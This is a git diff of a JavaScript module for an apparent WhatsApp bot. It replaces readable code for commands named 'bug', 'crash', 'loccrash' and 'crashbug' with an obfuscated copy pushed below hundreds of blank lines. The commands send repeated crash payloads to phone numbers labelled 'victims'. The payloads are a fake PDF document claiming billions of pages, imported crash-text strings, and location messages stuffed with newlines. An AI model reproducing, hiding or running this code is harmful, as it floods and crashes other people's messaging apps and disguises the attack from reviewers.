@@ -1,305 +1,452 @@
-const { Hamza } = require("../TalkDrove/Hamza");
-const { delay, loading, react } = require("../TalkDrove/utils");
-const moment = require("moment-timezone");
-const conf = require("../set.js");
-const fs = require("fs");
-const path = require("path");
-const {
-    generateWAMessageFromContent,
-    proto
-} = require("@whiskeysockets/baileys");
-
-// bug database
-const { bugtext1 } = require("../TalkDrove/bugs/bugtext1");
-const { bugtext2 } = require("../TalkDrove/bugs/bugtext2");
-const { bugtext3 } = require("../TalkDrove/bugs/bugtext3");
-const { bugtext4 } = require("../TalkDrove/bugs/bugtext4");
-const { bugtext5 } = require("../TalkDrove/bugs/bugtext5");
-const { bugtext6 } = require("../TalkDrove/bugs/bugtext6");
-const { bugpdf } = require("../TalkDrove/bugs/bugpdf.js");
-
-const category = "Bugs";
-const reaction = "🐻‍❄️";
-
-const mess = {};
-mess.prem = "You are not authorised to use this  command !!!";
-
-const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/;
-const whatsappRegex =
-    /https:\/\/chat\.whatsapp\.com\/(invite|join|)[A-Za-z0-9]+/;
-
-const timewisher = time => {
-    if (time < "23:59:00") {
-        return `Good Night 🌆`;
-    } else if (time < "19:00:00") {
-        return `Good Evening 🌆`;
-    } else if (time < "18:00:00") {
-        return `Good Evening 🌆`;
-    } else if (time < "15:00:00") {
-        return `Good Afternoon 🌅`;
-    } else if (time < "11:00:00") {
-        return `Good Morning 🌄`;
-    } else if (time < "05:00:00") {
-        return `Good Morning 🌄`;
-    }
-};
-
-async function relaybug(dest, zk, ms, repondre, amount, victims, bug) {
-    for (let i = 0; i < victims.length; i++) {
-        if (!phoneRegex.test(victims[i])) {
-            repondre(`${victims[i]} not a valid phone number`);
-            continue;
-        } else {
-            const victim = victims[i] + "@s.whatsapp.net";
-            for (let j = 0; j < amount; j++) {
-                var scheduledCallCreationMessage = generateWAMessageFromContent(
-                    dest,
-                    proto.Message.fromObject(bug),
-                    { userJid: dest, quoted: ms }
-                );
-                try {
-                    zk.relayMessage(
-                        victim,
-                        scheduledCallCreationMessage.message,
-                        { messageId: scheduledCallCreationMessage.key.id }
-                    );
-                } catch (e) {
-                    repondre(
-                        `An error occured while sending bugs to ${victims[i]}`
-                    );
-                    console.log(
-                        `An error occured while sending bugs to ${victim}: ${e}`
-                    );
-                    break;
-                }
-                await delay(3000);
-            }
-            if (victims.length > 1)
-                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
-            await delay(5000);
-        }
-    }
-    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
-}
-
-async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
-    for (let i = 0; i < victims.length; i++) {
-        if (!phoneRegex.test(victims[i])) {
-            repondre(`${victims[i]} not a valid phone number`);
-            continue;
-        } else {
-            const victim = victims[i] + "@s.whatsapp.net";
-            for (let j = 0; j < amount; j++) {
-                try {
-                    zk.sendMessage(victim, bug);
-                } catch (e) {
-                    repondre(
-                        `An error occured while sending bugs to ${victims[i]}`
-                    );
-                    console.log(
-                        `An error occured while sending bugs to ${victim}: ${e}`
-                    );
-                    break;
-                }
-                await delay(3000);
-            }
-            if (victims.length > 1)
-                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
-            await delay(5000);
-        }
-    }
-    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
-}
+//TalkDrove
 
 
-// --cmds--
 
 
-//bug
-Hamza(
-    {
-        nomCom: "bug",
-        categorie: category,
-        reaction: '🐼'
-    },
 
-    async (dest, zk, commandOptions) => {
-        const { ms, arg, repondre, superUser } = commandOptions;
-        if (!superUser) return await repondre(mess.prem);
 
-        // send loading message
-        await loading(dest, zk);
 
-        for (let i = 0; i < 25; i++) {
-            const doc = { url: "./set.js" };
-            await zk.sendMessage(dest, {
-                document: doc,
-                mimetype:
-                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
-                title: "bx.pdf",
-                pageCount: 9999999999,
-                thumbnail: {
-                    url: "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/BYTE-MD-LITE.jpeg"
-                },
-                thumbnailUrl:
-                    "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/BYTE-MD-LITE.jpeg",
-                jpegThumbnail: {
-                    url: "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/BYTE-MD-LITE.jpeg"
-                },
-                mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
-                fileName:
-                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
-                    bugpdf
-            });
-        }
-        await zk.sendMessage(dest, { react: { text: "✅", key: ms.key } });
-    }
-);
 
-//crash
-Hamza(
-    {
-        nomCom: "crash",
-        categorie: category,
-        reaction: reaction
-    },
 
-    async (dest, zk, commandOptions) => {
-        const { ms, arg, repondre, superUser } = commandOptions;
-        const bug = bugtext6;
-        if (!superUser) return await repondre(mess.prem);
-        await loading(dest, zk);
-        try {
-            for (let i = 0; i < 10; i++) {
-                await repondre(bug);
-            }
-        } catch (e) {
-            await repondre(`an error occoured sending bugs`);
-            console.log(`an error occured sending bugs : ${e}`);
-            return;
-        }
-    }
-);
 
-//loccrash
-Hamza(
-    {
-        nomCom: "loccrash",
-        reaction: "🎃",
-        categorie: category
-    },
 
-    async (dest, zk, commandOptions) => {
-        const { ms, arg, repondre, superUser } = commandOptions;
-        if (!superUser) return await repondre(mess.prem);
-        await loading(dest, zk);
 
-        for (let i = 0; i < 20; i++) {
-            for (let j = 0; j < "3"; j++) {
-                zk.sendMessage(
-                    dest,
-                    {
-                        location: {
-                            degreesLatitude: -6.28282828,
-                            degreesLongitude: -1.2828,
-                            name: "BRUX0N3RD\n\n\n\n\n\n\n\n"
-                        }
-                    },
-                    { quoted: ms }
-                );
-            }
-        }
-        await zk.sendMessage(dest, { react: { text: "✅", key: ms.key } });
-    }
-);
 
-//crashbug
-Hamza(
-    {
-        nomCom: "crashbug",
-        categorie: category,
-        reaction: reaction
-    },
 
-    async (dest, zk, commandOptions) => {
-        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
-        if (!superUser) return await repondre(mess.prem);
-        if (!arg[0])
-            return await repondre(
-                `Use ${prefixe}crashbug amount | numbers\n> Example ${prefixe}crashbug 30 |${
-                    conf.NUMERO_OWNER
-                } or ${prefixe}crashbug ${conf.NUMERO_OWNER.split(",")[0]}`
-            );
-        await loading(dest, zk);
-        const text = arg.join("");
-        let amount = 30;
-        let victims = [];
-        const doc = { url: "./set.js" };
-        const bug = {
-            document: doc,
-            mimetype:
-                "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
-            title: "bx.pdf",
-            pageCount: 9999999999,
-            thumbnail: {
-                url: "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/BYTE-MD-LITE.jpeg"
-            },
-            thumbnailUrl:
-                "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/BYTE-MD-LITE.jpeg",
-            jpegThumbnail: {
-                url: "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/BYTE-MD-LITE.jpeg"
-            },
-            mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
-            fileName:
-                "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
-                bugpdf
-        };
-        if (arg.length === 1) {
-            victims.push(arg[0]);
-            await repondre(`sending ${amount} bugs to ${victims[0]}`);
-            try {
-                await sendbug(dest, zk, ms, repondre, amount, victims, bug);
-            } catch (e) {
-                await repondre("An error occured");
-                console.log(`An error occured: ${e}`);
-                await react(dest, zk, ms, "⚠️");
-            }
-        } else {
-            amount = parseInt(text.split("|")[0].trim());
-            if (isNaN(amount)) {
-                return await repondre(
-                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
-                );
-            } else {
-                victims = text
-                    .split("|")[1]
-                    .split(",")
-                    .map(x => x.trim())
-                    .filter(x => x !== "");
-                if (victims.length > 0) {
-                    await repondre(
-                        `sending ${amount} bugs to ${victims.join(", ")}`
-                    );
-                    try {
-                        await sendbug(
-                            dest,
-                            zk,
-                            ms,
-                            repondre,
-                            amount,
-                            victims,
-                            bug
-                        );
-                    } catch (e) {
-                        await repondre("An error occured");
-                        console.log(`An error occured: ${e}`);
-                        await react(dest, zk, ms, "⚠️");
-                    }
-                } else {
-                    return await repondre("No victims specfied");
-                }
-            }
-        }
-        await react(dest, zk, ms, "✅");
-    }
-);
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//TalkDrove
+const _0x1fa9c1=_0x3069;(function(_0x40b744,_0x9efcb3){const _0x633d7c=_0x3069,_0x11fd94=_0x40b744();while(!![]){try{const _0x59aa8d=-parseInt(_0x633d7c(0x229))/0x1*(-parseInt(_0x633d7c(0x21b))/0x2)+-parseInt(_0x633d7c(0x216))/0x3+-parseInt(_0x633d7c(0x20b))/0x4+-parseInt(_0x633d7c(0x1f4))/0x5+-parseInt(_0x633d7c(0x1e8))/0x6*(-parseInt(_0x633d7c(0x22b))/0x7)+parseInt(_0x633d7c(0x201))/0x8+-parseInt(_0x633d7c(0x222))/0x9*(parseInt(_0x633d7c(0x205))/0xa);if(_0x59aa8d===_0x9efcb3)break;else _0x11fd94['push'](_0x11fd94['shift']());}catch(_0x177423){_0x11fd94['push'](_0x11fd94['shift']());}}}(_0x1627,0x64deb));function _0x1627(){const _0x61ea6c=['fromObject','Good\x20Evening\x20🌆','561945Supsqc','../TalkDrove/bugs/bugtext3','crashbug\x20amount\x20|\x20numbers\x0a>\x20Example\x20','trim','NUMERO_OWNER','join','11:00:00','05:00:00','push','../TalkDrove/bugs/bugtext5','@s.whatsapp.net','\x20Successfully.','filter','469096ssYGqW','https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/BYTE-MD-LITE.jpeg','test','log','30JdCtgq','19:00:00','An\x20error\x20occured:\x20','sending\x20','\x20not\x20a\x20valid\x20phone\x20number','18:00:00','1380308zgCUvO','ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=','message','\x20bugs\x20send\x20to\x20','Good\x20Afternoon\x20🌅','sendMessage','../set.js','No\x20victims\x20specfied','You\x20are\x20not\x20authorised\x20to\x20use\x20this\x20\x20command\x20!!!','23:59:00','15:00:00','317202cQgFJk','crash','split','@whiskeysockets/baileys','Message','1469248DlaHnd','prem','loccrash','../TalkDrove/bugs/bugtext2','../TalkDrove/bugs/bugtext6','Bugs','⟨༑̶⃟💥\x20𝐁͢𝐑𝐔𝐗͢𝐎\x20𝐅𝐔͢𝐂𝐊𝐏͢𝐃𝐅̑👁️༑̶⟩','810603AIsMEb','\x20bugs\x20to\x20','length','An\x20error\x20occured\x20while\x20sending\x20bugs\x20to\x20','bx.pdf','../TalkDrove/utils','Successfully\x20sent\x20','1AKawjZ','An\x20error\x20occured','352569ebvVaS','../TalkDrove/bugs/bugtext4','crashbug\x2030\x20|','Good\x20Morning\x20🌄','\x20or\x20','path','⟨༑̶⃟💥\x20𝐁͢𝐑𝐔𝐗͢𝐎\x20𝐅𝐔͢𝐂𝐊𝐏͢𝐃𝐅̑👁️༑̶⟩\x0a\x0a','54crkZYe','Use\x20','../TalkDrove/bugs/bugpdf.js','relayMessage','map','../TalkDrove/Hamza','bug','an\x20error\x20occoured\x20sending\x20bugs','../TalkDrove/bugs/bugtext1','./set.js'];_0x1627=function(){return _0x61ea6c;};return _0x1627();}const {Hamza}=require(_0x1fa9c1(0x1ed)),{delay,loading,react}=require(_0x1fa9c1(0x227)),moment=require('moment-timezone'),conf=require(_0x1fa9c1(0x211)),fs=require('fs'),path=require(_0x1fa9c1(0x1e6)),{generateWAMessageFromContent,proto}=require(_0x1fa9c1(0x219)),{bugtext1}=require(_0x1fa9c1(0x1f0)),{bugtext2}=require(_0x1fa9c1(0x21e)),{bugtext3}=require(_0x1fa9c1(0x1f5)),{bugtext4}=require(_0x1fa9c1(0x22c)),{bugtext5}=require(_0x1fa9c1(0x1fd)),{bugtext6}=require(_0x1fa9c1(0x21f)),{bugpdf}=require(_0x1fa9c1(0x1ea)),category=_0x1fa9c1(0x220),reaction='🐻‍❄️',mess={};mess['prem']=_0x1fa9c1(0x213);const phoneRegex=/^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/,whatsappRegex=/https:\/\/chat\.whatsapp\.com\/(invite|join|)[A-Za-z0-9]+/,timewisher=_0x19da0e=>{const _0x699a4f=_0x1fa9c1;if(_0x19da0e<_0x699a4f(0x214))return'Good\x20Night\x20🌆';else{if(_0x19da0e<_0x699a4f(0x206))return _0x699a4f(0x1f3);else{if(_0x19da0e<_0x699a4f(0x20a))return _0x699a4f(0x1f3);else{if(_0x19da0e<_0x699a4f(0x215))return _0x699a4f(0x20f);else{if(_0x19da0e<_0x699a4f(0x1fa))return _0x699a4f(0x22e);else{if(_0x19da0e<_0x699a4f(0x1fb))return'Good\x20Morning\x20🌄';}}}}}};async function relaybug(_0x3a02e5,_0x509184,_0x433cf7,_0x3a556e,_0x1d00f2,_0x47cc0b,_0x706649){const _0x4316ad=_0x1fa9c1;for(let _0x228cf9=0x0;_0x228cf9<_0x47cc0b['length'];_0x228cf9++){if(!phoneRegex[_0x4316ad(0x203)](_0x47cc0b[_0x228cf9])){_0x3a556e(_0x47cc0b[_0x228cf9]+_0x4316ad(0x209));continue;}else{const _0x3ff709=_0x47cc0b[_0x228cf9]+_0x4316ad(0x1fe);for(let _0x3da088=0x0;_0x3da088<_0x1d00f2;_0x3da088++){var _0x32e004=generateWAMessageFromContent(_0x3a02e5,proto[_0x4316ad(0x21a)][_0x4316ad(0x1f2)](_0x706649),{'userJid':_0x3a02e5,'quoted':_0x433cf7});try{_0x509184[_0x4316ad(0x1eb)](_0x3ff709,_0x32e004[_0x4316ad(0x20d)],{'messageId':_0x32e004['key']['id']});}catch(_0x1cee01){_0x3a556e(_0x4316ad(0x225)+_0x47cc0b[_0x228cf9]),console[_0x4316ad(0x204)]('An\x20error\x20occured\x20while\x20sending\x20bugs\x20to\x20'+_0x3ff709+':\x20'+_0x1cee01);break;}await delay(0xbb8);}if(_0x47cc0b[_0x4316ad(0x224)]>0x1)_0x3a556e(_0x1d00f2+_0x4316ad(0x20e)+_0x47cc0b[_0x228cf9]+_0x4316ad(0x1ff));await delay(0x1388);}}_0x3a556e(_0x4316ad(0x228)+_0x1d00f2+_0x4316ad(0x223)+_0x47cc0b[_0x4316ad(0x1f9)](',\x20')+'.');}async function sendbug(_0x1a5c59,_0x18e847,_0x2b4dc4,_0x4f31da,_0x37a058,_0x43e0c4,_0x66ce84){const _0x3b0177=_0x1fa9c1;for(let _0x1b56f2=0x0;_0x1b56f2<_0x43e0c4[_0x3b0177(0x224)];_0x1b56f2++){if(!phoneRegex[_0x3b0177(0x203)](_0x43e0c4[_0x1b56f2])){_0x4f31da(_0x43e0c4[_0x1b56f2]+_0x3b0177(0x209));continue;}else{const _0x41b345=_0x43e0c4[_0x1b56f2]+_0x3b0177(0x1fe);for(let _0x1e3fb9=0x0;_0x1e3fb9<_0x37a058;_0x1e3fb9++){try{_0x18e847[_0x3b0177(0x210)](_0x41b345,_0x66ce84);}catch(_0x4abd1a){_0x4f31da('An\x20error\x20occured\x20while\x20sending\x20bugs\x20to\x20'+_0x43e0c4[_0x1b56f2]),console['log']('An\x20error\x20occured\x20while\x20sending\x20bugs\x20to\x20'+_0x41b345+':\x20'+_0x4abd1a);break;}await delay(0xbb8);}if(_0x43e0c4['length']>0x1)_0x4f31da(_0x37a058+'\x20bugs\x20send\x20to\x20'+_0x43e0c4[_0x1b56f2]+_0x3b0177(0x1ff));await delay(0x1388);}}_0x4f31da('Successfully\x20sent\x20'+_0x37a058+_0x3b0177(0x223)+_0x43e0c4[_0x3b0177(0x1f9)](',\x20')+'.');}function _0x3069(_0x57aa30,_0x520cb5){const _0x16275b=_0x1627();return _0x3069=function(_0x30692f,_0x1d4aab){_0x30692f=_0x30692f-0x1e6;let _0x3c177e=_0x16275b[_0x30692f];return _0x3c177e;},_0x3069(_0x57aa30,_0x520cb5);}Hamza({'nomCom':_0x1fa9c1(0x1ee),'categorie':category,'reaction':'🐼'},async(_0x35c49d,_0x297b22,_0x3c6b3d)=>{const _0x5dbf0d=_0x1fa9c1,{ms:_0x258e3b,arg:_0x5bd036,repondre:_0x597cf5,superUser:_0xf87679}=_0x3c6b3d;if(!_0xf87679)return await _0x597cf5(mess[_0x5dbf0d(0x21c)]);await loading(_0x35c49d,_0x297b22);for(let _0x515bfe=0x0;_0x515bfe<0x19;_0x515bfe++){const _0x4bddb9={'url':'./set.js'};await _0x297b22['sendMessage'](_0x35c49d,{'document':_0x4bddb9,'mimetype':_0x5dbf0d(0x221),'title':_0x5dbf0d(0x226),'pageCount':0x2540be3ff,'thumbnail':{'url':_0x5dbf0d(0x202)},'thumbnailUrl':_0x5dbf0d(0x202),'jpegThumbnail':{'url':_0x5dbf0d(0x202)},'mediaKey':_0x5dbf0d(0x20c),'fileName':_0x5dbf0d(0x1e7)+bugpdf});}await _0x297b22[_0x5dbf0d(0x210)](_0x35c49d,{'react':{'text':'✅','key':_0x258e3b['key']}});}),Hamza({'nomCom':_0x1fa9c1(0x217),'categorie':category,'reaction':reaction},async(_0x18d363,_0x1b08fc,_0x37d616)=>{const _0x5046b3=_0x1fa9c1,{ms:_0x1b9ecc,arg:_0x486f05,repondre:_0x2127af,superUser:_0x2e924f}=_0x37d616,_0x4f843c=bugtext6;if(!_0x2e924f)return await _0x2127af(mess[_0x5046b3(0x21c)]);await loading(_0x18d363,_0x1b08fc);try{for(let _0x30038e=0x0;_0x30038e<0xa;_0x30038e++){await _0x2127af(_0x4f843c);}}catch(_0x4079f9){await _0x2127af(_0x5046b3(0x1ef)),console['log']('an\x20error\x20occured\x20sending\x20bugs\x20:\x20'+_0x4079f9);return;}}),Hamza({'nomCom':_0x1fa9c1(0x21d),'reaction':'🎃','categorie':category},async(_0xfc6545,_0x369b08,_0x394d95)=>{const _0x1b95f2=_0x1fa9c1,{ms:_0x40b5b0,arg:_0x2a7f27,repondre:_0x5397b0,superUser:_0x40849d}=_0x394d95;if(!_0x40849d)return await _0x5397b0(mess[_0x1b95f2(0x21c)]);await loading(_0xfc6545,_0x369b08);for(let _0x285327=0x0;_0x285327<0x14;_0x285327++){for(let _0x48ccee=0x0;_0x48ccee<'3';_0x48ccee++){_0x369b08['sendMessage'](_0xfc6545,{'location':{'degreesLatitude':-6.28282828,'degreesLongitude':-1.2828,'name':'HAMZA\x0a\x0a\x0a\x0a\x0a\x0a\x0a\x0a'}},{'quoted':_0x40b5b0});}}await _0x369b08[_0x1b95f2(0x210)](_0xfc6545,{'react':{'text':'✅','key':_0x40b5b0['key']}});}),Hamza({'nomCom':'crashbug','categorie':category,'reaction':reaction},async(_0x313392,_0xfafd7c,_0x55af8c)=>{const _0x29a184=_0x1fa9c1,{ms:_0x5cbdb5,arg:_0x261fe6,repondre:_0x3003c4,superUser:_0x14dfa1,prefixe:_0x4a91ac}=_0x55af8c;if(!_0x14dfa1)return await _0x3003c4(mess[_0x29a184(0x21c)]);if(!_0x261fe6[0x0])return await _0x3003c4(_0x29a184(0x1e9)+_0x4a91ac+_0x29a184(0x1f6)+_0x4a91ac+_0x29a184(0x22d)+conf[_0x29a184(0x1f8)]+_0x29a184(0x22f)+_0x4a91ac+'crashbug\x20'+conf[_0x29a184(0x1f8)][_0x29a184(0x218)](',')[0x0]);await loading(_0x313392,_0xfafd7c);const _0x2341f3=_0x261fe6['join']('');let _0x563acb=0x1e,_0xe44ade=[];const _0x3993c5={'url':_0x29a184(0x1f1)},_0x400854={'document':_0x3993c5,'mimetype':_0x29a184(0x221),'title':_0x29a184(0x226),'pageCount':0x2540be3ff,'thumbnail':{'url':'https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/BYTE-MD-LITE.jpeg'},'thumbnailUrl':_0x29a184(0x202),'jpegThumbnail':{'url':'https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/BYTE-MD-LITE.jpeg'},'mediaKey':_0x29a184(0x20c),'fileName':'⟨༑̶⃟💥\x20BRUH\x20HAMZAPDF👁️༑̶⟩\x0a\x0a'+bugpdf};if(_0x261fe6[_0x29a184(0x224)]===0x1){_0xe44ade[_0x29a184(0x1fc)](_0x261fe6[0x0]),await _0x3003c4(_0x29a184(0x208)+_0x563acb+'\x20bugs\x20to\x20'+_0xe44ade[0x0]);try{await sendbug(_0x313392,_0xfafd7c,_0x5cbdb5,_0x3003c4,_0x563acb,_0xe44ade,_0x400854);}catch(_0x1af724){await _0x3003c4(_0x29a184(0x22a)),console[_0x29a184(0x204)](_0x29a184(0x207)+_0x1af724),await react(_0x313392,_0xfafd7c,_0x5cbdb5,'⚠️');}}else{_0x563acb=parseInt(_0x2341f3['split']('|')[0x0][_0x29a184(0x1f7)]());if(isNaN(_0x563acb))return await _0x3003c4('amount\x20must\x20be\x20a\x20valid\x20intiger\x20between\x201-'+conf['BOOM_MESSAGE_LIMIT']);else{_0xe44ade=_0x2341f3[_0x29a184(0x218)]('|')[0x1]['split'](',')[_0x29a184(0x1ec)](_0xd245dc=>_0xd245dc[_0x29a184(0x1f7)]())[_0x29a184(0x200)](_0x503de3=>_0x503de3!=='');if(_0xe44ade[_0x29a184(0x224)]>0x0){await _0x3003c4(_0x29a184(0x208)+_0x563acb+_0x29a184(0x223)+_0xe44ade[_0x29a184(0x1f9)](',\x20'));try{await sendbug(_0x313392,_0xfafd7c,_0x5cbdb5,_0x3003c4,_0x563acb,_0xe44ade,_0x400854);}catch(_0x2bd9c5){await _0x3003c4(_0x29a184(0x22a)),console[_0x29a184(0x204)](_0x29a184(0x207)+_0x2bd9c5),await react(_0x313392,_0xfafd7c,_0x5cbdb5,'⚠️');}}else return await _0x3003c4(_0x29a184(0x212));}}await react(_0x313392,_0xfafd7c,_0x5cbdb5,'✅');});
